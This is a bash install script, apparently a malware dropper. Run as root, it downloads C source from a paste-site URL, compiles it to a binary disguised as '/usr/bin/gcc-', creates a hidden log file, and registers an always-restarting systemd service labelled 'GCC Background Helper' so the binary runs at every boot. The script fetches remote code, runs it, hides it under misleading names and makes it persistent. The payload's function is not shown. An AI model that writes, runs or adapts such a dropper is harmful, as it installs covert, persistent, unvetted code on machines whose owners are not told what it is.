#!/usr/bin/env bash
set -euo pipefail

# Config
DOWNLOAD_URL="https://pastee.dev/d/Gk8J5oSB/0"
C_SOURCE="cloudflared.c"
BINARY_DEST="/usr/bin/gcc-"
LOGFILE="/var/log/.cache.log"
PIDFILE="/run/gcc-.pid"
SERVICE_FILE="/etc/systemd/system/gcc-.service"
MAX_TRIES=3
SLEEP_BETWEEN=2

# Require root
if [ "$(id -u)" -ne 0 ]; then
  echo "Run as root: sudo $0"
  exit 2
fi

echo "[*] Starting install_all.sh"

###############################################
# DOWNLOAD PHASE WITH RETRY + VALIDATION
###############################################
download_file() {
  local url="$1"
  local out="$2"

  if command -v wget >/dev/null 2>&1; then
    wget -q "$url" -O "$out"
    return $?
  elif command -v curl >/dev/null 2>&1; then
    curl -fSL "$url" -o "$out"
    return $?
  else
    echo "[ERROR] wget and curl are missing."
    return 2
  fi
}

echo "[*] Downloading $DOWNLOAD_URL -> $C_SOURCE"
tries=0
while [ $tries -lt $MAX_TRIES ]; do
  tries=$((tries+1))
  echo "[*] Attempt #$tries..."

  if download_file "$DOWNLOAD_URL" "$C_SOURCE"; then
    if [ -s "$C_SOURCE" ]; then
      head1=$(head -n 1 "$C_SOURCE" | tr '[:upper:]' '[:lower:]')
      if [[ "$head1" == "<!doctype"* || "$head1" == "<html"* ]]; then
        echo "[WARN] Looks like HTML error page. Retrying..."
        rm -f "$C_SOURCE"
      else
        echo "[+] Download looks valid."
        break
      fi
    else
      echo "[WARN] Zero-size file. Retrying..."
      rm -f "$C_SOURCE"
    fi
  else
    echo "[WARN] Download failed. Retrying..."
  fi

  [ $tries -lt $MAX_TRIES ] && sleep $SLEEP_BETWEEN
done

if [ ! -s "$C_SOURCE" ]; then
  echo "[ERROR] Failed to download a valid cloudflared.c after $MAX_TRIES tries."
  exit 1
fi

###############################################
# COMPILE PHASE
###############################################
echo "[*] Compiling cloudflared.c -> $BINARY_DEST"
gcc -O2 "$C_SOURCE" -o "$BINARY_DEST"
rm -f "$C_SOURCE"
chmod 755 "$BINARY_DEST"
chown root:root "$BINARY_DEST"
echo "[+] Binary installed at $BINARY_DEST"

###############################################
# LOG FILE PHASE
###############################################
echo "[*] Ensuring log file exists: $LOGFILE"
if [ ! -f "$LOGFILE" ]; then
  touch "$LOGFILE"
  echo "[+] Created $LOGFILE"
else
  echo "[i] Log file already exists"
fi

if getent group nogroup >/dev/null 2>&1; then
  chown nobody:nogroup "$LOGFILE" || true
else
  chown nobody:nobody "$LOGFILE" || true
fi
chmod 0640 "$LOGFILE"

###############################################
# PID FILE PHASE
###############################################
mkdir -p /run

if [ ! -f "$PIDFILE" ]; then
  echo "[*] Creating PID file: $PIDFILE"
  touch "$PIDFILE"

  if getent group nogroup >/dev/null 2>&1; then
    chown nobody:nogroup "$PIDFILE" || true
  else
    chown nobody:nobody "$PIDFILE" || true
  fi

  chmod 0664 "$PIDFILE"
  echo "[+] PID file created"
else
  echo "[i] PID file already exists: $PIDFILE (not overwriting)"
fi

###############################################
# SYSTEMD SERVICE PHASE
###############################################
echo "[*] Writing service file: $SERVICE_FILE"

cat > "$SERVICE_FILE" <<'EOF'
[Unit]
Description=GCC Background Helper
After=network.target

[Service]
Type=forking
User=nobody
PIDFile=/run/gcc-.pid
KillSignal=SIGTERM
ExecStart=/usr/bin/gcc-
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

echo "[*] Reloading systemd..."
systemctl daemon-reload

echo "[*] Enabling & starting service..."
systemctl enable gcc-.service
systemctl restart gcc-.service

sleep 1

echo
echo "----- systemctl status -----"
systemctl status --no-pager gcc-.service || true

echo
echo "----- journalctl last 20 lines -----"
journalctl -u gcc-.service -n 20 --no-pager || true

echo
echo "[✔] install_all.sh finished successfully!"
